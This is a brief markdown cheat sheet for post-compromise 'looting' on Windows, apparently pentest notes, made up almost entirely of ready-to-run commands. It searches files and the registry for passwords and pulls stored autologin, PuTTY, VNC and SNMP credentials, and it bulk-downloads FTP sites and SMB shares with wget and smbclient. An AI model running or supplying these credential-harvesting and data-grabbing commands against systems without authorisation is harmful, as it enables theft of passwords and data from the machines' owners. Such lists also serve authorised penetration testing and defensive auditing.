# Data Collection  aka looting

## Windows  

Searching inside files for passwords.  
`cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt`  
`findstr /si password *.xml *.ini *.txt *.config`  
`findstr /spin "password" *.*`  

searching for files with certain filenames  
`dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*`  
`where /R C:\ user.txt`  
`where /R C:\ *.ini`  

search the registry for key names and passwords  
`REG QUERY HKLM /F "password" /t REG_SZ /S /K`  
`REG QUERY HKCU /F "password" /t REG_SZ /S /K`  

`reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # Windows Autologin`  
`reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"`  
`reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" # SNMP parameters`  
`reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" # Putty clear text proxy credentials`  
`reg query "HKCU\Software\ORL\WinVNC3\Password" # VNC credentials`  
`reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password`  

`reg query HKLM /f pass /t REG_SZ /s`
`reg query HKLM /f password /t REG_SZ /s`   
`reg query HKCU /f password /t REG_SZ /s`  

## Mirror FTP sites  

```
wget -r -nH ftp://anonymous:anonymous@ipaddress[:port]//
```
## Download using smbclient

`smbclient '\\server\share' -N -c 'prompt OFF;recurse ON;cd 'path\to\directory\';lcd '~/path/to/download/to/';mget *'`
